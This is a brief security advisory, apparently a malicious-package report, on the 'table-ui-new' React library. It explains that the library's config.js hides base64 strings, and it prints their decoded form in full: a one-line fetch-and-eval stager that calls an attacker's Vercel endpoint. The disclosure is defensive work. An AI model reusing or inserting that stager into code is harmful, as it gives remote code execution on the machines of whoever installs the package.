summary: table-ui-new ships base64-obfuscated remote fetch-and-eval stagers pointing at an attacker-controlled Vercel endpoint
details: dist/config.js exports an array named HASHES containing four base64-encoded strings. Each string decodes to an async IIFE of the form `async () => eval(await fetch('https://everydaynodechecker-39147n.vercel.app/api/key?mem=root{0..3}').then(r=>r.text()))`, i.e. fetch a remote script and pass it directly to eval(). The identifier `HASHES` and the file name `config.js` are a cover story for executable payloads; the fetched code is mutable and attacker-controlled, so any consumer path that reads and evaluates these strings yields arbitrary remote code execution on the host. A React table-hooks library has no legitimate reason to ship base64-obfuscated eval-of-remote-fetch payloads pointing at an unrelated Vercel deployment.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
